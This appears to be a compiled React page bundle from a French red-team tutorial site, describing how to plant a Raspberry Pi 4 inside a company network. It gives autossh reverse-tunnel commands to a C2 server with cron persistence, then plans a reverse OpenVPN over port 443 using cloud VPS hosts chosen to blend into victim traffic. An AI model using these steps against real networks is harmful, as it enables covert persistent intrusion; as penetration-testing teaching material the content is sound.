{\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 210\n      },\n      __self: this\n    }), \"##You should now see a wireless network named \\u201Ciphone10\\u201D (or whatever named you use)\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 211\n      },\n      __self: this\n    }), \" where you can connect to it with your wpa_passphrase you set earlier. You\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 211\n      },\n      __self: this\n    }), \" should also have Internet too assuming your Raspberry Pi 4 has Internet. Once\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 211\n      },\n      __self: this\n    }), \" connected, you can also SSH into your Raspberry Pi 4.\"), React.createElement(\"h4\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 214\n      },\n      __self: this\n    }, \"Configurer un tunnel reverse shell automatique\"), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 215\n      },\n      __self: this\n    }, \"Cette section suppose que vous disposez d'un serveur de commande et de contr\\xF4le accessible sur Internet et que le serveur a activ\\xE9 SSH\"), React.createElement(\"div\", {\n      id: \"wifi\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 217\n      },\n      __self: this\n    }, \"apt-get install autossh \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 218\n      },\n      __self: this\n    }), \"ssh-keygen [Leave all of the settings default] \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 219\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 219\n      },\n      __self: this\n    }), \"scp /root/.ssh/id_rsa.pub root@[C2 IP Address]:/directory/on/C2\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 221\n      },\n      __self: this\n    }), \"Append the contents of id_rsa.pub to ~/.ssh/authorized_keys or create this file on the C2 server:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 224\n      },\n      __self: this\n    }), \"[On the C2 server] cat /directory/to/upload/to/id_rsa.pub >> ~/.ssh/authorized_keys\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 228\n      },\n      __self: this\n    }), \"[On the RASPBERRY Pi 4]\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 230\n      },\n      __self: this\n    }), \"ssh root@[C2 IP address]\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 232\n      },\n      __self: this\n    }), \"Test \\u201Cautossh\\u201D:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 233\n      },\n      __self: this\n    }), \"autossh -M 11166 -i /root/.ssh/id_rsa -R 6667:localhost:22 root@[C2 IP Address]\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 235\n      },\n      __self: this\n    }), \"If you login to your VPS/C2 server, you should now see port 6667 present after you run a \\u201Cnetstat -antp\\u201D command.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 236\n      },\n      __self: this\n    }), \"To have the autossh start at boot, we will create a cronjob that points to a script. First we will create a bash script for our autossh file:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 238\n      },\n      __self: this\n    }), \"nano /bin/autossh-connect.sh\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 240\n      },\n      __self: this\n    }), \"Then we place the autossh command inside the autossh-connect.sh file:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 241\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 241\n      },\n      __self: this\n    }), \"#!/bin/bash\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 243\n      },\n      __self: this\n    }), \"autossh -M 11166 -N -f -o \\u201CPubkeyAuthentication=yes\\u201D -o \\u201CPasswordAuthentication=no\\u201D \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 244\n      },\n      __self: this\n    }), \"-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Your C2 Server IP] &\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 244\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 244\n      },\n      __self: this\n    }), \"-N: Do not execute a command on the middleman machine\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 246\n      },\n      __self: this\n    }), \"-f: Drop in the background\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 247\n      },\n      __self: this\n    }), \"&: Execute this command but do not wait for output or an exit code. If this is not added, your machine might hang at boot\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 248\n      },\n      __self: this\n    }), \"For the cronjob creation, type the following command:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 250\n      },\n      __self: this\n    }), \"crontab -e\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 252\n      },\n      __self: this\n    }), \"At the bottom of the script (no \\u201C#\\u201D should be in front of what you are typing), add the following:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 253\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 253\n      },\n      __self: this\n    }), \"@reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 255\n      },\n      __self: this\n    }), \"*/5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 256\n      },\n      __self: this\n    }), \"This tells the cron job after reboot to wait 5 seconds and run the \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 257\n      },\n      __self: this\n    }), \"autossh-connect.sh script which will start the autossh process. \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 257\n      },\n      __self: this\n    }), \"The 5 seconds was added to ensure the network manager has started first. The \\u201C> /dev/null 2>&1\\u201D part ensures that no logs are written out to any files as to not take up space. On the second line, the cron job will also try and run every 5 minutes. This is due in case the autossh job gets disconnected or fails for whatever reason.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 259\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 259\n      },\n      __self: this\n    }), \"That\\u2019s it. Now when your Raspberry Pi 4 starts, it should autossh to your C2 server which will create a local port of 6667 on the C2 server. When you SSH from your attacker system onto the C2 server, you can run the following command on your C2 server to get access to your Raspberry Pi 4 device:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 261\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 261\n      },\n      __self: this\n    }), \"ssh localhost -p 6667 [This is ran on the C2 server]\"), React.createElement(\"h4\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 267\n      },\n      __self: this\n    }, \"Configurer un client et un serveur Openvpn\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 268\n      },\n      __self: this\n    }, \"Bien que nous puissions faire un shell SSH invers\\xE9 pour acc\\xE9der \\xE0 notre Raspberry, il serait \\xE9galement int\\xE9ressant de configurer l'appareil pour utiliser une connexion OpenVPN invers\\xE9e sur le port 443 (HTTPS).\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 269\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 269\n      },\n      __self: this\n    }), \"\\xC9tant donn\\xE9 que la Raspberry sera probablement d\\xE9pos\\xE9e \\xE0 l'arri\\xE8re d'un switch dans une entreprise, nous ne pourrons pas nous y connecter directement. Par cons\\xE9quent, la Raspberry sortira d'abord via le port 443 vers notre serveur OpenVPN Access Server. Depuis notre box attaquant Kali, nous devrons \\xE9galement nous connecter au serveur VPN. Cela est une assurance du fait que si le client bloque le port 22 sortant pour SSH, nous aurons une autre option pour se connecter sur le port 443 (HTTPS).\"), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 273\n      },\n      __self: this\n    }, \"Il faut pour cela r\\xE9aliser les 3 \\xE9tapes suivantes de configuration :\"), React.createElement(\"ul\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 274\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 275\n      },\n      __self: this\n    }, \"OpenVPN Access Server sur Internet\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 276\n      },\n      __self: this\n    }, \"la Raspberry\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 277\n      },\n      __self: this\n    }, \"La machine d'attaque\")), React.createElement(\"h5\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 280\n      },\n      __self: this\n    }, \"Configurer OpenVPN Access Server\"), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 281\n      },\n      __self: this\n    }, \"Pour la solution d'h\\xE9bergement de notre serveur VPN on pourrait opter pour un serveur VPS car ils sont extr\\xEAmement faciles et rapides \\xE0 configurer. Vultr.com et Amazon Lightsail sont deux fournisseurs de VPS rapides, bon march\\xE9 et simples \\xE0 configurer. L'autre raison de choisir ces fournisseurs VPS est la d\\xE9tection du trafic, le r\\xE9seau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet d'\\xEAtre plus discret.\"));\n  }\n\n}\n\nexport default Redteam;","map":{"version":3,"sources":["C:/Users/Nico/hackingfornoobs_frontend/src/components/Redteam.js"],"names":["React","Hide","KaliRaspberry","Redteam","Component","render"],"mappings":"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